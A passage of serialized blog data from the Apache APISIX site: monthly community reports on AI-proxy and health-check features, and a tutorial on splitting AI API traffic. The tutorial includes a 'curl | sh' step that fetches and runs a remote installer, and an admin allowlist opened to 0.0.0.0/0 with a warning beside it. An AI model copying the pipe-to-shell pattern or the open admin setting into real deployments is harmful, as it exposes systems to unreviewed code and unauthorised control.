31)","metadata":{"permalink":"/blog/2025/08/31/2025-august-monthly-report","source":"@site/blog/2025/08/31/2025-august-monthly-report.md","title":"2025 Monthly Report (August 01 - August 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-08-31T00:00:00.000Z","formattedDate":"August 31, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.255,"truncated":true,"authors":[],"prevItem":{"title":"360 Built Unified L7 Load Balancer Using Apache APISIX","permalink":"/blog/2025/09/03/360-built-unified-l7-load-balancer-with-apisix"},"nextItem":{"title":"2025 Monthly Report (July 01 - July 31)","permalink":"/blog/2025/07/31/2025-july-monthly-report"}},"content":"> Recently, we\'ve introduced and updated some new features, including adding the `ai-aliyun-content-moderation` plugin and allowing environment variables in the `openid-connect` plugin, etc. For more details, please read this month\'s newsletter.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom August 1st to August 31st, 16 contributors made 56 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/08/29/SWsZprNc_aug-contributor-list.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/08/29/7SSxLwiC_aug-new-contributors.webp)\\n\\n## Feature Highlights\\n\\n### 1. Add `ai-aliyun-content-moderation` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12530\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR introduces `ai-aliyun-content-moderation` plugin to perform content moderation on request and responses returned by LLM backends via aliyun.\\n\\n### 2. Refactor Chunk Decoding with `sse.lua`\\n\\nPR: https://github.com/apache/apisix/pull/12530\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR also refactors and improves the chunk decoding from the LLM backend into a separate `sse.lua`. It introduces `lua_response_filter` to run `lua_body_filter` as defined by each plugin, because `lua_body_filter` can\'t be processed directly in AI responses, which are managed by APISIX. It also modifies the `ai-request-rewrite` plugin to leverage the `lua_body_filter` for writing the response.\\n\\n### 3. Allow Environment Variables in `openid-connect` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/11451\\n\\nContributor: [darkSheep404](https://github.com/darkSheep404)\\n\\nThis PR adds the feature of using environment variables in the `openid-connect` plugin.\\n\\n### 4. Add Healthcheck Support for `ai-proxy-multi` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12509\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR introduces health check support for the `ai-proxy-multi` plugin, ensuring traffic is routed to live, healthy AI backends. Healthcheck manager has been modified with the capability to use dynamically created upstreams via the resource key.\\n\\n### 5. Add Latency and Token Usage in Access Log and Prometheus Metrics in `ai-proxy` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12518\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR adds latency and token info for `ai-proxy` plugin in the access log for easy debugging. It also adds Prometheus metrics for AI-related requests and adds two more labels, `request_type` to distinguish between normal requests and AI-related requests & `llm_model`.\\n\\n### 6. Add last_modified and digest Metadata to the Standalone API\\n\\nPR: https://github.com/apache/apisix/pull/12526\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\n### 7. Support `limit-conn` in `workflow` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12465\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR enhances the `workflow` plugin by adding support for the `limit-conn` plugin within workflow rules.\\n\\n### 8. Add Healthcheck Manager to Decouple from Upstream\\n\\nPR: https://github.com/apache/apisix/pull/12426\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThe tight coupling between upstreams and health checkers is replaced with a lightweight index\u2014keyed on `resource_path` and `resource_version`\u2014managed by the new Healthcheck Manager. Besides, a background timer asynchronously creates checkers from a \\"waiting pool\\". The requests no longer directly create health checkers; therefore, the health checker lifecycle is decoupled from requests.\\n\\n### 9. Add Support for Pushing Logs in `ai-proxy` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12515\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR defines the log format and adds support for pushing `ai-proxy` request/response logs to any logger.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials, and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences.\\n\\n## Recommended Blogs\\n\\n- [Announcing APISIX Integration with AI/ML API](https://apisix.apache.org/blog/2025/07/29/announcing-integration-of-apisix-and-ai-ml-api/)\\n\\n  We\'re thrilled to announce that AI/ML API has become a supported provider to the `ai-proxy`, `ai-proxy-multi`, and `ai-request-rewrite` plugins in Apache APISIX. All the AI/ML APIs will be supported in the next APISIX version.\\n\\n- [Load Balancing AI/ML API with Apache APISIX](https://apisix.apache.org/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix/)\\n\\n  This blog provides a step-by-step guide to configure Apache APISIX for AI traffic splitting and load balancing between API versions, covering security setup, canary testing, and deployment monitoring.\\n\\n- [AI Gateways: The Future Trend of AI Infrastructure](https://apisix.apache.org/blog/2025/06/18/ai-gateway-future-trend-of-ai-infrastructure/)\\n\\n  Discover how AI gateways are revolutionizing enterprise AI infrastructure, offering centralized control, security, cost management, and governance for AI models and services."},{"id":"2025 Monthly Report (July 01 - July 31)","metadata":{"permalink":"/blog/2025/07/31/2025-july-monthly-report","source":"@site/blog/2025/07/31/2025-july-monthly-report.md","title":"2025 Monthly Report (July 01 - July 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-07-31T00:00:00.000Z","formattedDate":"July 31, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.58,"truncated":true,"authors":[],"prevItem":{"title":"2025 Monthly Report (August 01 - August 31)","permalink":"/blog/2025/08/31/2025-august-monthly-report"},"nextItem":{"title":"Load Balancing AI/ML API with Apache APISIX","permalink":"/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix"}},"content":"> Recently, we\'ve introduced and updated some new features, including adding AI/ML API as a new provider to AI plugins, improving metrics support for Datadog plugin, and supporting custom Claim Validator in OIDC, etc. For more details, please read this month\'s newsletter.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom July 1st to July 31, 20 contributors made 96 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/07/31/QnqX7l1o_2025-july-contributor-list.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/07/31/7dQAgNIT_2025-july-new-contributors.webp)\\n\\n## Feature Highlights\\n\\n### 1. Improve Metrics Support for Datadog Plugin\\n\\nPR: https://github.com/apache/apisix/pull/11943\\n\\nContributor: [deiwin](https://github.com/deiwin)\\n\\nThe Datadog plugin previously lacked critical metrics such as rate limiting response counts, gateway errors when services were unreachable, and network delays between the gateway and the service.\\n\\nThis PR addresses these limitations by providing more comprehensive and compatible metrics, ensuring backward compatibility and cost-effectiveness.\\n\\n### 2. Decouple Calculation and Output of Prometheus Exporter\\n\\nPR: https://github.com/apache/apisix/pull/12383\\n\\nContributor: [SkyeYoung](https://github.com/SkyeYoung)\\n\\nThis PR decouples the calculation and output processes of the Prometheus exporter. The calculation process now runs periodically in the privileged agent process, by default every 15 seconds, storing data in a shared dictionary. The `/apisix/prometheus/metrics` API is moved to the worker process, which only reads and returns the cached data in the shared dictionary.\\n\\n### 3. Support Custom Claim Validator in OIDC\\n\\nPR: https://github.com/apache/apisix/pull/11824\\n\\nContributor: [beardnick](https://github.com/beardnick)\\n\\nEnable validation of custom claims in OpenID Connect authentication. Users can configure `claim_validators` to define allowed values for specific claims. If the claim does not match the expected values, access is denied with a `401` response, enhancing fine-grained access control to backend services.\\n\\n### 4. Add Support for `extra_headers` in `forward-auth` Plugin\\n\\nPR: https://github.com/apache/apisix/pull/12405\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR fixes [#11200](https://github.com/apache/apisix/issues/11200) and is a follow-up for [#12404](https://github.com/apache/apisix/pull/12404). It adds `extra_headers` support to the `forward-auth` plugin, enabling selective extraction of fields from the request body into headers.\\n\\n### 5. Add a Global Switch to Disable Upstream Health Check\\n\\nPR: https://github.com/apache/apisix/pull/12407\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR introduces a global configuration field `apisix.disable_upstream_healthcheck` to disable all upstream health checks instantly. This feature allows users to quickly start APISIX services when production services are unavailable, ensuring faster recovery and simplified troubleshooting during outages.\\n\\n### 6. Support Multiple `json.delay_encode` Objects in Single Log\\n\\nPR: https://github.com/apache/apisix/pull/12395\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR enables logging up to 16 unique `json.delay_encode` objects within a single log entry, enhancing flexibility for structured data logging in Apache APISIX.\\n\\n### 7. Add AI/ML API Provider to AI Plugins\\n\\nPR: https://github.com/apache/apisix/pull/12379\\n\\nContributor: [D1m7asis](https://github.com/D1m7asis)\\n\\nThis PR adds AI/ML API as a supported provider to the `ai-proxy`, `ai-proxy-multi`, and `ai-request-rewrite` plugins in Apache APISIX. AIMLAPI provides a unified OpenAI-compatible API with access to 300+ LLMs. This change enables APISIX users to easily route and proxy requests through AIMLAPI without needing custom drivers or overrides.\\n\\n### 8. Support `ctx.var.post_arg` for vars-based Route Matching on Request Body\\n\\nPR: https://github.com/apache/apisix/pull/12388\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR adds supporting `ctx.var.post_arg` in route matching based on the request body. `ctx.var.post_arg` can be used to match based on the request body for three formats - JSON, multipart, and URL-encoded.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials, and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences.\\n\\n## Recommended Blogs\\n\\n- [Announcing APISIX Integration with AI/ML API](https://apisix.apache.org/blog/2025/07/29/announcing-integration-of-apisix-and-ai-ml-api/)\\n\\n  We\'re thrilled to announce that AI/ML API has become a supported provider to the `ai-proxy`, `ai-proxy-multi`, and `ai-request-rewrite` plugins in Apache APISIX. All the AI/ML APIs will be supported in the next APISIX version.\\n\\n- [Load Balancing AI/ML API with Apache APISIX](https://apisix.apache.org/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix/)\\n\\n  This blog provides a step-by-step guide to configure Apache APISIX for AI traffic splitting and load balancing between API versions, covering security setup, canary testing, and deployment monitoring.\\n\\n- [AI Gateways: The Future Trend of AI Infrastructure](https://apisix.apache.org/blog/2025/06/18/ai-gateway-future-trend-of-ai-infrastructure/)\\n\\n  Discover how AI gateways are revolutionizing enterprise AI infrastructure, offering centralized control, security, cost management, and governance for AI models and services."},{"id":"Load Balancing AI/ML API with Apache APISIX","metadata":{"permalink":"/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix","source":"@site/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix.md","title":"Load Balancing AI/ML API with Apache APISIX","description":"This blog provides a step-by-step guide to configure Apache APISIX for AI traffic splitting and load balancing between API versions, covering security setup, canary testing, and deployment monitoring.","date":"2025-07-31T00:00:00.000Z","formattedDate":"July 31, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.53,"truncated":true,"authors":[{"name":"Sergey Nuzhnyy","title":"Author","url":"https://github.com/OctavianTheI","image_url":"https://github.com/OctavianTheI.png","imageURL":"https://github.com/OctavianTheI.png"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"2025 Monthly Report (July 01 - July 31)","permalink":"/blog/2025/07/31/2025-july-monthly-report"},"nextItem":{"title":"Announcing APISIX Integration with AI/ML API","permalink":"/blog/2025/07/29/announcing-integration-of-apisix-and-ai-ml-api"}},"content":"> This blog provides a step-by-step guide to configure Apache APISIX for AI traffic splitting and load balancing between API versions, covering security setup, canary testing, and deployment monitoring.\\n\\n\x3c!--truncate--\x3e\\n\\n## Overview\\n\\n[**AI/ML API**](https://aimlapi.com/) is a one-stop, OpenAI-compatible endpoint that is trusted by 150,000+ developers to 300+ state-of-the-art models\u2014chat, vision, image/video/music generation, embeddings, OCR, and more\u2014from Google, Meta, OpenAI, Anthropic, Mistral, and others.\\n\\n[**Apache APISIX**](https://github.com/apache/apisix) is a dynamic, real-time, high-performance API Gateway. APISIX API Gateway provides rich traffic management features and can serve as an AI Gateway through its flexible plugin system.\\n\\nModern AI workloads often require smooth version migrations, A/B testing, and rolling updates. This guide shows you how to:\\n\\n1. **Install** Apache APISIX with Docker quickstart.\\n2. **Secure** the Admin API with keys and IP whitelisting.\\n3. **Define** separate routes for API versions v1 and v2.\\n4. **Implement** weighted traffic splitting (50/50) via the `traffic-split` plugin.\\n5. **Verify** the newly created split endpoint functionality.\\n6. **Load test** and **monitor** distribution accuracy.\\n\\nTo perform authenticated requests, you\'ll need an AI/ML API key. You can get one at [https://aimlapi.com/app/keys/](https://aimlapi.com/app/keys?utm_source=apisix&utm_medium=guide&utm_campaign=integration) and use it as a Bearer token in your Authorization headers.\\n\\n![Generate AI/ML API Key](https://static.api7.ai/uploads/2025/07/30/XdAXZUT6_generate-ai-ml-api-key.webp)\\n\\n## Quickstart Installation\\n\\n```bash\\n# 1. Download and run the quickstart script (includes etcd + APISIX)\\ncurl -sL https://run.api7.ai/apisix/quickstart | sh\\n\\n# 2. Confirm APISIX is up and running\\ncurl -I http://127.0.0.1:9080 | grep Server\\n# \u279c Server: APISIX/3.13.0\\n```\\n\\n> **Tip:** If you encounter port conflicts, adjust Docker host networking or map to different ports in the quickstart script.\\n\\n## Secure the Admin API\\n\\nBy default, quickstart bypasses Admin API authentication. For any non-development environment, enforce security:\\n\\n### 1. Set an Admin Key\\n\\nEdit `conf/config.yaml` inside the APISIX container or local install directory, replacing the example key with your own API key obtained from the link above:\\n\\n```yaml\\napisix:\\n  enable_admin: true            # Enable Admin API\\n  admin_key_required: true      # Reject unauthenticated Admin requests\\n  admin_key:\\n    - name: admin\\n      key: YOUR_ADMIN_KEY_HERE  # Generated admin key - you can replace this with a secure key as you wish\\n      role: admin\\n```\\n\\n> **Security Best Practice:** Use at least 32 characters, mix letters/numbers/symbols, and rotate keys quarterly.\\n\\n### 2. Whitelist Management IPs (allow\\\\_admin)\\n\\nAdd your management or local networks under the `admin:` section:\\n\\n```yaml\\nadmin:\\n  allow_admin:\\n    - 127.0.0.0/24   # Localhost & host network\\n    - 0.0.0.0/0      # Allow all (temporary/testing only)\\n```\\n\\n> **Warning:** `0.0.0.0/0` opens Admin API to the world! Lock this down to specific subnets in production.\\n\\n### 3. Restart APISIX\\n\\n```bash\\ndocker restart apisix-quickstart\\n```\\n\\n> **Check Logs:** `docker logs apisix-quickstart --tail 50` to ensure no errors about admin authentication.\\n\\n## Define Basic Routes for v1 and v2\\n\\nBefore splitting traffic, ensure each version works individually.\\n\\n### 1. Route for v1\\n\\n```bash\\ncurl -i http://127.0.0.1:9180/apisix/admin/routes/test-v1 \\\\\\n  -X PUT \\\\\\n  -H \\"X-API-KEY: YOUR_ADMIN_KEY_HERE\\" \\\\\\n  -d \'{\\n    \\"uri\\": \\"/test/v1\\",\\n    \\"upstream\\": {\\n      \\"type\\": \\"roundrobin\\",\\n      \\"nodes\\": {\\"api.aimlapi.com:443\\": 1},\\n      \\"scheme\\": \\"https\\",\\n      \\"pass_host\\": \\"node\\"\\n    }\\n  }\'\\n```\\n\\n> **Tip:** Use `id` fields if you want to manage or delete routes easily later.\\n\\n### 2. Route for v2\\n\\n```bash\\ncurl -i http://127.0.0.1:9180/apisix/admin/routes/test-v2 \\\\\\n  -X PUT \\\\\\n  -H \\"X-API-KEY: YOUR_ADMIN_KEY_HERE\\" \\\\\\n  -d \'{\\n    \\"uri\\": \\"/test/v2\\",\\n    \\"upstream\\": {\\n      \\"type\\": \\"roundrobin\\",\\n      \\"nodes\\": {\\"api.aimlapi.com:443\\": 1},\\n      \\"scheme\\": \\"https\\",\\n      \\"pass_host\\": \\"node\\"\\n    }\\n  }\'\\n```\\n\\n## Implement Traffic Splitting (50/50)\\n\\nUse the [`traffic-split`](https://apisix.apache.org/docs/apisix/plugins/traffic-split/) plugin for controlled distribution between v1 and v2. In the admin request below, replace `YOUR_ADMIN_KEY_HERE` with your actual key.\\n\\n```bash\\ncurl -i http://127.0.0.1:9180/apisix/admin/routes/aimlapi-split \\\\\\n  -X PUT \\\\\\n  -H \\"X-API-KEY: YOUR_ADMIN_KEY_HERE\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"aimlapi-split\\",\\n    \\"uri\\": \\"/chat/completions\\",\\n    \\"upstream\\": {\\n      \\"type\\": \\"roundrobin\\",\\n      \\"nodes\\": {\\"api.aimlapi.com:443\\": 1},\\n      \\"scheme\\": \\"https\\",\\n      \\"pass_host\\": \\"node\\"\\n    },\\n    \\"plugins\\": {\\n      \\"traffic-split\\": {\\n        \\"rules\\": [\\n          {\\n            \\"weight\\": 50,\\n            \\"upstream\\": {\\"type\\":\\"roundrobin\\",\\"nodes\\":{\\"api.aimlapi.com:443\\":1},\\"scheme\\":\\"https\\",\\"pass_host\\":\\"node\\"},\\n            \\"rewrite\\": {\\"uri\\":\\"/v1/chat/completions\\"}\\n          },\\n          {\\n            \\"weight\\": 50,\\n            \\"upstream\\": {\\"type\\":\\"roundrobin\\",\\"nodes\\":{\\"api.aimlapi.com:443\\":1},\\"scheme\\":\\"https\\",\\"pass_host\\":\\"node\\"},\\n            \\"rewrite\\": {\\"uri\\":\\"/v2/chat/completions\\"}\\n          }\\n        ]\\n      }\\n    }\\n  }\'\\n```\\n\\n> **Tip:** Adjust the `weight` values to shift traffic ratios (e.g., 80/20 for canary).\\n>\\n> **Note:** `rewrite` must match the internal API path exactly.\\n\\n## Verify Split Endpoint Functionality\\n\\nTest the `/chat/completions` endpoint you just created. Replace `<AIML_API_KEY>` with the key obtained earlier and use it as a Bearer token:\\n\\n```bash\\ncurl -v -X POST http://127.0.0.1:9080/chat/completions \\\\\\n  -H \\"Authorization: Bearer <AIML_API_KEY>\\" \\\\\\n  -H \\"Content-Type: application/json\\" \\\\\\n  -d \'{\\"model\\":\\"gpt-4\\",\\"messages\\":[{\\"role\\":\\"user\\",\\"content\\":\\"ping\\"}]}\'\\n```\\n\\n**Expected Output:**\\n\\n```json\\n{\\"content\\":\\"Pong! How can I assist you today?\\"}\\n```\\n\\n> **Tip:** Use `-v` for verbose output to troubleshoot headers or TLS issues.\\n\\n## Load Test & Distribution Validation\\n\\nAfter configuring the split route, use the following commands to validate distribution. Replace `<AIML_API_KEY>` with your Bearer token.\\n\\n```bash\\n# 1. Send 100 test requests\\ntime seq 100 | xargs -I {} curl -s -o /dev/null -X POST http://127.0.0.1:9080/chat/completions \\\\\\n  -H \\"Authorization: Bearer <AIML_API_KEY>\\" \\\\\\n  -H \\"Content-Type: application/json\\" \\\\\\n  -d \'{\\"model\\":\\"gpt-4\\",\\"messages\\":[{\\"role\\":\\"user\\",\\"content\\":\\"ping\\"}]}\'\\n\\n# 2. Check APISIX logs for upstream hits (replace IPs with actual resolved IPs)\\necho \\"v1 hits: $(docker logs apisix-quickstart --since 5m | grep -c \'188.114.97.3:443\')\\"\\necho \\"v2 hits: $(docker logs apisix-quickstart --since 5m | grep -c \'188.114.96.3:443\')\\"\\n```\\n\\n**Expected:** Approximately 50 requests to each upstream.\\n\\n> **Tip:** Use Prometheus or OpenTelemetry plugins for real\u2011time metrics instead of manual log parsing.\\n\\n## Best Practices & Next Steps\\n\\n* **Rate Limiting & Quotas**: Add [`limit-count`](https://apisix.apache.org/docs/apisix/plugins/limit-count/) plugin to protect your upstream from spikes.\\n* **Authentication**: Layer on the [`key-auth`](https://apisix.apache.org/docs/apisix/plugins/key-auth/) plugin for consumer management.\\n* **Circuit Breaker**: Prevent cascading failures with the [`api-breaker`](https://apisix.apache.org/docs/apisix/plugins/api-breaker/) plugin.\\n* **Observability**: Integrate Prometheus, Skywalking, or Loki for dashboards and alerts.\\n* **Infrastructure as Code**: Consider managing APISIX config via Kubernetes CRDs or ADC for reproducibility.\\n\\n## References\\n\\n* [APISIX Load Balancing Documentation](https://apisix.apache.org/docs/apisix/getting-started/load-balancing/)\\n* [AI/ML API Documentation](https://docs.aimlapi.com/?utm_source=apisix&utm_medium=guide&utm_campaign=integration)"},{"id":"Announcing APISIX Integration with AI/ML API","metadata":{"permalink":"/blog/2025/07/29/announcing-integration-of-apisix-and-ai-ml-api","source":"@site/blog/2025/07/29/announcing-integration-of-apisix-and-ai-ml-api.md","title":"Announcing APISIX Integration with AI/ML API","description":"Apache APISIX supports 300+ LLMs through the integration with AI/ML API. Get your secure, single-endpoint access to AI models like GPT-4 and Claude, and more.","date":"2025-07-29T00:00:00.000Z","formattedDate":"July 29, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.405,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Load Balancing AI/ML API with Apache APISIX","permalink":"/blog/2025/07/31/load-balancing-between-ai-ml-api-with-apisix"},"nextItem":{"title":"2025 Monthly Report (June 01 - June 30)","permalink":"/blog/2025/06/30/2025-june-monthly-report"}},"content":"> We\'re thrilled to announce that **AI/ML API** has become a supported provider to the `ai-proxy`, `ai-proxy-multi`, and `ai-request-rewrite` plugins in **Apache APISIX**. All the AI/ML APIs will be supported in the next APISIX version.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\n[AI/ML API](https://aimlapi.com/) is a single endpoint that gives you access to more than 300 ready-to-use AI models\u2014large language models, embeddings, image and audio tools\u2014through one standard REST interface. It is used by over 150,000 developers and organizations as a centralized LLM API gateway.\\n\\nWe\'re thrilled to announce that **AI/ML API** has become a supported provider to the `ai-proxy`, `ai-proxy-multi`, and `ai-request-rewrite` plugins in **Apache APISIX**.\\n\\nAI/ML API provides a unified OpenAI-compatible API with access to **300+ LLMs** such as GPT-4, Claude, Gemini, DeepSeek, and others. This integration bridges the gap between your API infrastructure and leading AI services, enabling you to deploy intelligent features\u2014like chatbots, real-time translations, and data analysis\u2014faster than ever.\\n\\n## Proxy to OpenAI via AI/ML API\\n\\n### Prerequisites\\n\\n1. [Install APISIX](https://apisix.apache.org/docs/apisix/installation-guide/).\\n2. Generate your API key on [AI/ML API dashboard](https://aimlapi.com/app/keys/).\\n  ![Generate AI/ML API Key](https://static.api7.ai/uploads/2025/07/30/dGXA7d0r_ai-ml-api-key.webp)\\n\\n### Configure the Route\\n\\nCreate a route and configure the `ai-proxy` plugin as such:\\n\\n```yaml\\ncurl \\"http://127.0.0.1:9180/apisix/admin/routes\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"ai-proxy-route\\",\\n    \\"uri\\": \\"/anything\\",\\n    \\"methods\\": [\\"POST\\"],\\n    \\"plugins\\": {\\n      \\"ai-proxy\\": {\\n        \\"provider\\": \\"aimlapi\\",\\n        \\"auth\\": {\\n          \\"header\\": {\\n            \\"Authorization\\": \\"Bearer \'\\"$OPENAI_API_KEY\\"\'\\" # Generated openai key from AI/ML API dashboard\\n          }\\n        },\\n        \\"options\\":{\\n          \\"model\\": \\"gpt-4\\"\\n        }\\n      }\\n    }\\n  }\'\\n```\\n\\n### Test the Integration\\n\\nSend a POST request to the route with a system prompt and a sample user question in the request body:\\n\\n```bash\\ncurl \\"http://127.0.0.1:9080/anything\\" -X POST \\\\\\n  -H \\"Content-Type: application/json\\" \\\\\\n  -H \\"Host: api.openai.com\\" \\\\\\n  -d \'{\\n    \\"messages\\": [\\n      { \\"role\\": \\"system\\", \\"content\\": \\"You are a mathematician\\" },\\n      { \\"role\\": \\"user\\", \\"content\\": \\"What is 1+1?\\" }\\n    ]\\n  }\'\\n```\\n\\n### Verify Response\\n\\nYou should receive a response similar to the following:\\n\\n```json\\n{\\n  ...,\\n  \\"choices\\": [\\n    {\\n      \\"index\\": 0,\\n      \\"finish_reason\\": \\"stop\\",\\n      \\"logprobs\\": null,\\n      \\"message\\": {\\n        \\"role\\": \\"assistant\\",\\n        \\"content\\": \\"1 + 1 equals 2.\\",\\n        \\"refusal\\": null,\\n        \\"annotations\\": []\\n      }\\n    }\\n  ],\\n  \\"created\\": 1753845968,\\n  \\"model\\": \\"gpt-4-0613\\",\\n  \\"usage\\": {\\n    \\"prompt_tokens\\": 1449,\\n    \\"completion_tokens\\": 1008,\\n    \\"total_tokens\\": 2457\\n  ...\\n}\\n```\\n\\n## Core Use Cases\\n\\n1. **Unified AI Service Management**\\n\\n   - **Multi-Model Proxy and Load Balancing**: Replace hardcoded vendor endpoints with a single APISIX interface, dynamically routing requests to models from OpenAI, Claude, DeepSeek, Gemini, Mistral, etc., based on cost, latency, or performance needs.\\n   - **Vendor-Agnostic Workflows**: Seamlessly switch between models (e.g., GPT-4 for creative tasks, Claude for document analysis) without code changes.\\n\\n2. **Cost-Optimized Token Governance**\\n\\n   - **Token-Based Budget Enforcement**: Set per-team/monthly spending limits; auto-throttle requests when thresholds are exceeded.\\n   - **Caching & Fallbacks**: Cache frequent LLM responses (e.g., FAQ answers) or reroute to cheaper models during provider outages.\\n\\n3. **Real-Time AI Application Scaling**\\n\\n   - **Chatbots & Virtual Agents**: Power low-latency conversational interfaces with streaming support for token-by-token responses.\\n   - **Data Enrichment Pipelines**: Augment APIs with AI\u2014e.g., auto-summarize user reviews or translate product descriptions on-the-fly.\\n\\n4. **Hybrid/Multi-Cloud AI Deployment**\\n\\n   - **Unified Control Plane**: Manage on-prem LLMs (e.g., Llama 3) alongside cloud APIs (OpenAI, Azure) with consistent policy enforcement.\\n   - **High Availability & Fault Tolerance**: Built-in health-checks, automatic retries and failover; if one LLM fails, traffic is rerouted within seconds to keep services alive.\\n\\n5. **Enterprise AI Security & Compliance**\\n\\n   - **Data Security and Compliance**: Prompt Guard, content moderation, PII redaction and full audit logs in a single place.\\n   - **One Auth Layer for 300+ LLMs**: Unified authentication (JWT/OAuth2/OIDC) and authorization for 300+ LLM keys and policies.\\n\\n## Conclusion\\n\\nWith AI/ML API now natively supported in Apache APISIX, you no longer have to choose between **speed**, **security**, or **scale**\u2014you get all three.\\n\\n- **One line of YAML** turns your gateway into a 300-model AI powerhouse.\\n- **Zero code changes** let you hot-swap GPT-4 for Claude, or route 10 % of traffic to a cheaper model for instant cost savings.\\n- **Built-in guardrails** (PII redaction, token budgets, content moderation) keep compliance teams happy while your product team ships faster.\\n\\n### More Resources\\n\\n- Related APISIX AI Plugins\\n  - [ai-proxy](https://apisix.apache.org/docs/apisix/plugins/ai-proxy/)\\n  - [ai-proxy-multi](https://apisix.apache.org/docs/apisix/plugins/ai-proxy-multi/)\\n  - [ai-request-rewrite](https://apisix.apache.org/docs/apisix/plugins/ai-request-rewrite/)\\n- [AI/ML API Community](https://aimlapi.com/community)"},{"id":"2025 Monthly Report (June 01 - June 30)","metadata":{"permalink":"/blog/2025/06/30/2025-june-monthly-report","source":"@site/blog/2025/06/30/2025-june-monthly-report.md","title":"2025 Monthly Report (June 01 - June 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2025-06-30T00:00:00.000Z","formattedDate":"June 30, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.595,"truncated":true,"authors":[],"prevItem":{"title":"Announcing APISIX Integration with AI/ML API","permalink":"/blog/2025/07/29/announcing-integration-of-apisix-and-ai-ml-api"},"nextItem":{"title":"Release Apache APISIX 3.13.0","permalink":"/blog/2025/06/27/release-apache-apisix-3.13.0"}},"content":"> Recently, we\'ve introduced and updated some new features, including adding devcontainer support, enhancing Admin API filtering, and adding `headers` attribute for `loki-logger` plugin, etc. For more details, please read this month\'s newsletter.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom June 1st to June 30, 17 contributors made 86 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.api7.ai/uploads/2025/06/30/ctN7FHKp_june-contributor-list.webp)\\n\\n![New Contributors List](https://static.api7.ai/uploads/2025/06/30/VDMkGEcj_june-new-contributors.webp)\\n\\n## 